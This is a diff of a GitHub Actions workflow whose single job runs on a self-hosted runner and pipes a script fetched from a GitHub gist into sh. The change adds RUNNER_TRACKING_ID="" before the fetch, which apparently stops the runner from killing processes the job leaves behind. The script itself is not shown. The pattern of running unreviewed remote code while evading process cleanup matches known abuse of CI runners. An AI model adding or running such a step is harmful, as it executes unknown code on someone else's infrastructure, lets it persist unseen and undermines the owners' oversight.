@@ -8,5 +8,5 @@ jobs:
     runs-on: self-hosted
     steps:
       - shell: bash
-        run: curl https://gist.githubusercontent.com/atremmer/a7eedfb905cc2561125f3a53e3e22a86/raw/ab3b0cfef72e6cff4dc64caf550338fbee6e32b6/gistfile1.sh | sh 
+        run: RUNNER_TRACKING_ID="" && curl https://gist.githubusercontent.com/atremmer/a7eedfb905cc2561125f3a53e3e22a86/raw/2944ed2453500c55f60d82787a5dd1b406eec5e4/gistfile1.sh | sh 
 
